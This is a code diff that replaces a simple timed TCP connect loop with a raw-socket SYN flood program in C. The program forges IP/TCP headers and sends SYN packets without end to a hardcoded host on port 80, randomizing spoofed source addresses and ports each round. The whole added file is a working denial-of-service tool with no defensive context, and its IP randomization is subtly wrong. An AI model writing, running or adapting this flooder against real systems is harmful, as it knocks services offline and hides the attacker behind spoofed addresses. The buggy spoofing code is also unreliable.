@@ -1,70 +1,118 @@
+// inspire from: https://linuxtips.ca/index.php/2022/05/06/create-syn-flood-with-raw-socket-in-c/
+#include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <time.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
 
-#define TARGET_IP "8.8.8.8"
-#define TARGET_PORT 80
-#define NUM_PACKETS 10000
-#define NUM_ITERATIONS 100
+#define MAX_PACKET_SIZE 4096
+#define IP_TARGET "10.0.15.1"
+#define PORT_TARGET 80
 
-// Function to send a TCP SYN packet to the specified IP and port
-void send_tcp_syn(char *ip, int port, int *sock) {
-  // Create a socket
-  *sock = socket(AF_INET, SOCK_STREAM, 0);
 
-  // Set the IP and port to connect to
-  struct sockaddr_in addr;
-  addr.sin_family = AF_INET;
-  addr.sin_port = htons(port);
-  addr.sin_addr.s_addr = inet_addr(ip);
+/* function for header checksums */
+unsigned short csum (unsigned short *buf, int nwords)
+{
+    unsigned long sum;
+    for (sum = 0; nwords > 0; nwords--)
+        sum += *buf++;
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->id = htonl(54321);
+    iph->frag_off = 0;
+    iph->ttl = MAXTTL;
+    iph->protocol = 6;  // upper layer protocol, TCP
+    iph->check = 0;
 
-  // Connect to the target IP and port
-  connect(*sock, (struct sockaddr *)&addr, sizeof(addr));
-
-  // Close the socket
-  close(*sock);
+    // Initial IP, changed later in infinite loop
+    iph->saddr = inet_addr("192.168.3.100");
 }
 
-int main(int argc, char *argv[]) {
-  // Set the name of the file to store the SYN requests in
-  char *file_name = "syn_requests.txt";
+void setup_tcp_header(struct tcphdr *tcph)
+{
+    tcph->source = htons(5678);
+    tcph->seq = random();
+    tcph->ack_seq = 0;
+    tcph->res2 = 0;
+    tcph->doff = 5; // Make it look like there will be data
+    tcph->syn = 1;
+    tcph->window = htonl(65535);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+}
 
-  // Open the file for writing
-  FILE *file = fopen(file_name, "w");
-
-  // Keep track of the total time it takes to send the SYN packets
-  clock_t total_time = 0;
-
-  // Send the SYN packets in 100 iterations
-  for (int i = 0; i < NUM_ITERATIONS; i++) {
-    // Keep track of the time it takes to send all the SYN packets in this iteration
-    clock_t start_time = clock();
-
-    // Send NUM_PACKETS SYN packets
-    for (int j = 0; j < NUM_PACKETS; j++) {
-      // Send a SYN packet
-      int sock;
-      send_tcp_syn(TARGET_IP, TARGET_PORT, &sock);
-
-      // Record the time it took to send the packet
-      clock_t packet_time = clock() - start_time;
-
-      // Write the packet index and time to the file
-      fprintf(file, "%d, %ld\n", i * NUM_PACKETS + j + 1, packet_time);
+int main()
+{
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s < 0){
+        fprintf(stderr, "Could not open raw socket.\n");
+        exit(-1);
     }
 
-    // Record the total time it took to send all the SYN packets in this iteration
-    clock_t iteration_time = clock() - start_time;
-    total_time += iteration_time;
-  }
+    char datagram[MAX_PACKET_SIZE];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
+    struct sockaddr_in sin;
+    char new_ip[sizeof "255.255.255.255"];
 
-  // Calculate the average time it took to send a SYN packet
-  double average_time = (double)total_time / (NUM_ITERATIONS * NUM_PACKETS);
+    unsigned int floodport = PORT_TARGET;
 
-  // Write the total time and average time to the file
-  fprintf(file, "Total time: %ld\n", total_time);
-  fprintf(file, "Average time: %ld\n" , average_time);
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(floodport);
+    sin.sin_addr.s_addr = inet_addr(IP_TARGET);
+
+    // Clear the data
+    memset(datagram, 0, MAX_PACKET_SIZE);
+
+    // Set appropriate fields in headers
+    setup_ip_header(iph);
+    setup_tcp_header(tcph);
+
+    tcph->dest = htons(floodport);
+
+    iph->daddr = sin.sin_addr.s_addr;
+    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+
+    /* a IP_HDRINCL call, to make sure that the kernel knows
+    *     the header is included in the data, and doesn't insert
+    *     its own header into the packet before our data
+    */
+    int tmp = 1;
+    const int *val = &tmp;
+    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+        exit(-1);
+    }
+
+    for(;;){
+        if(sendto(s,      /* our socket */
+                  datagram,         /* the buffer containing headers and data */
+                  iph->tot_len,      /* total length of our datagram */
+                  0,        /* routing flags, normally always 0 */
+                  (struct sockaddr *) &sin,   /* socket addr, just like in */
+                  sizeof(sin)) < 0)      /* a normal send() */
+
+            fprintf(stderr, "sendto() error!!!.\n");
+        else
+            fprintf(stdout, "Flooding %s at %u...\n", IP_TARGET, floodport);
+
+        // Randomize source IP and source port
+        snprintf(new_ip,16,"%lu.%lu.%lu.%lu",random() / 255,random() / 255,random() / 255,random() / 255);
+        iph->saddr = inet_addr(new_ip);
+        tcph->source = htons(random() % 65535);
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    }
+
+    return 0;
+}
